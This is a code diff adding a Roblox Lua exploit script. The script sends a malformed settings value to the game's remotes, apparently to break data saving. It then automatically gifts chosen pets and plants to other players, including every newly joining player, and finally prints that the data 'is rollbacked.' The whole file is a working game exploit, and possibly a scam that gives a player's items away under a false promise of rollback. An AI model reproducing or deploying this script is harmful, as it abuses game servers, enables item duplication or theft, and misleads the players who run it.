@@ -1,0 +1,274 @@
+local MODE = 2
+-- mew
+-- mew
+-- jayce bayot
+
+warn('MODE:', MODE)
+
+if not game:IsLoaded() then
+	game.Loaded:Wait() -- Watermark: Native - OB ❤
+end
+
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local StarterGui = game:GetService('StarterGui')
+local TeleportService = game:GetService('TeleportService')
+
+StarterGui:SetCore('DevConsoleVisible', true)
+
+local LocalPlayer = Players.LocalPlayer
+
+while true do
+	if LocalPlayer:GetAttribute('DataLoaded') then
+		break
+	end
+	task.wait()
+end
+
+local BlacklistedUsernames = {
+	'jailstorage_1',
+}
+
+local BrainrotNames = {
+	'Garamararam',
+}
+
+local TargetItems = {}
+
+local Rejoin = function()
+	for i, v in pairs(Players:GetPlayers()) do
+		if v ~= LocalPlayer then
+			v:Destroy()
+		end
+	end
+
+	if #Players:GetPlayers() <= 1 then
+		LocalPlayer:Kick('\nRejoining...')
+		task.wait()
+		TeleportService:Teleport(game.PlaceId, LocalPlayer)
+	else
+		TeleportService:TeleportToPlaceInstance(
+			game.PlaceId,
+			game.JobId,
+			LocalPlayer
+		)
+	end
+end
+
+local GiftItem = nil
+
+local Remotes = ReplicatedStorage:FindFirstChild('Remotes')
+local BridgeNet2 = ReplicatedStorage:FindFirstChild('BridgeNet2')
+
+-- Helpers for specific items
+local function isMrCarrot(item)
+	return string.find(item.Name, 'Mr Carrot') ~= nil
+end
+
+local function isTomatrio(item)
+	return string.find(item.Name, 'Tomatrio') ~= nil
+end
+
+if BridgeNet2 then
+	local dataRemoteEvent = BridgeNet2:FindFirstChild('dataRemoteEvent')
+
+	dataRemoteEvent:FireServer({
+		{
+			Value = true,
+			Setting = 'Graphics\255',
+		},
+		'\x14',
+	})
+
+	GiftItem = function(Player)
+		for i, v in pairs(TargetItems) do
+			local Timestamp = os.clock()
+
+			local Function = function()
+				for i2, v2 in pairs(LocalPlayer.Character:GetChildren()) do
+					if v2:IsA('Tool') then
+						i.Parent = LocalPlayer.Backpack
+					end
+				end
+
+				i.Parent = LocalPlayer.Character
+
+				dataRemoteEvent:FireServer({
+					{
+						Item = i,
+						ToGift = Player.Name,
+					},
+					'\x15',
+				})
+			end
+
+			Function()
+
+			while
+				i.Parent == LocalPlayer.Backpack
+				or i.Parent == LocalPlayer.Character
+			do
+				if (os.clock() - Timestamp) > 1 then
+					warn('Taking too long, re-invoking function.')
+					Function()
+					Timestamp = os.clock()
+				end
+				task.wait()
+			end
+
+			TargetItems[i] = nil
+		end
+
+		warn('Method 1 done.')
+	end
+elseif Remotes then
+	local ChangeSetting = Remotes:FindFirstChild('ChangeSetting')
+
+	ChangeSetting:FireServer({
+		Value = true,
+		Setting = 'Graphics\255',
+	})
+
+	GiftItem = function(Player)
+		local GiftItemRemote = Remotes:FindFirstChild('GiftItem')
+
+		for i, v in pairs(TargetItems) do
+			local Timestamp = os.clock()
+
+			local Function = function()
+				for i2, v2 in pairs(LocalPlayer.Character:GetChildren()) do
+					if v2:IsA('Tool') then
+						i.Parent = LocalPlayer.Backpack
+					end
+				end
+
+				i.Parent = LocalPlayer.Character
+
+				GiftItemRemote:FireServer({
+					Item = i,
+					ToGift = Player.Name,
+				})
+			end
+
+			Function()
+
+			while
+				i.Parent == LocalPlayer.Backpack
+				or i.Parent == LocalPlayer.Character
+			do
+				if (os.clock() - Timestamp) > 1 then
+					warn('Taking too long, re-invoking function.')
+					Function()
+					Timestamp = os.clock()
+				end
+				task.wait()
+			end
+
+			TargetItems[i] = nil
+		end
+
+		warn('Method 2 done.')
+	end
+end
+
+local BackpackChildAdded = function(child)
+	task.spawn(function()
+		if
+			child:GetAttribute('Brainrot')
+			or child:GetAttribute('IsPlant')
+			or isMrCarrot(child)
+			or isTomatrio(child)
+		then
+			if MODE == 1 then
+				child:GetPropertyChangedSignal('Parent'):Connect(function()
+					if not TargetItems[child] then
+						if
+							child.Parent
+							and child.Parent.Parent ~= LocalPlayer
+							and child.Parent.Parent.Parent == Players
+						then
+							for i, v in
+								pairs(LocalPlayer.Backpack:GetChildren())
+							do
+								if not TargetItems[v] then
+									if
+										(
+											v:GetAttribute('Brainrot')
+											and v:GetAttribute('Brainrot')
+												== child:GetAttribute(
+													'Brainrot'
+												)
+										)
+										or (v:GetAttribute('IsPlant') and v:GetAttribute(
+											'IsPlant'
+										) == child:GetAttribute(
+											'IsPlant'
+										))
+										or isMrCarrot(v)
+										or isTomatrio(v)
+									then
+										TargetItems[v] = true
+									end
+								end
+							end
+							GiftItem(child.Parent.Parent)
+						end
+					end
+				end)
+			elseif MODE == 2 then
+				if
+					table.find(BrainrotNames, child:GetAttribute('Brainrot'))
+					or isMrCarrot(child)
+					or isTomatrio(child)
+				then
+					TargetItems[child] = true
+					warn('Added target item:', child.Name)
+					child:GetPropertyChangedSignal('Parent'):Connect(function()
+						if
+							child.Parent
+							and child.Parent.Parent ~= LocalPlayer
+							and child.Parent.Parent.Parent == Players
+						then
+							TargetItems[child] = nil
+						end
+					end)
+				end
+			end
+		end
+	end)
+end
+
+for i, v in pairs(LocalPlayer.Backpack:GetChildren()) do
+	BackpackChildAdded(v)
+end
+
+LocalPlayer.Backpack.ChildAdded:Connect(BackpackChildAdded)
+
+if MODE == 2 then
+	local PlayerAdded = function(Player)
+		task.spawn(function()
+			if Player ~= LocalPlayer then
+				if not table.find(BlacklistedUsernames, Player.Name) then
+					while Player and Player.Parent == Players do
+						if Player:GetAttribute('DataLoaded') then
+							break
+						end
+						task.wait()
+					end
+
+					GiftItem(Player)
+				end
+			end
+		end)
+	end
+
+	for i, v in pairs(Players:GetPlayers()) do
+		PlayerAdded(v)
+	end
+
+	Players.PlayerAdded:Connect(PlayerAdded)
+end
+
+warn('Data is rollbacked.')
+print('DATA IS BEING ROLLBACKED.')
+warn('Data is rollbacked.')
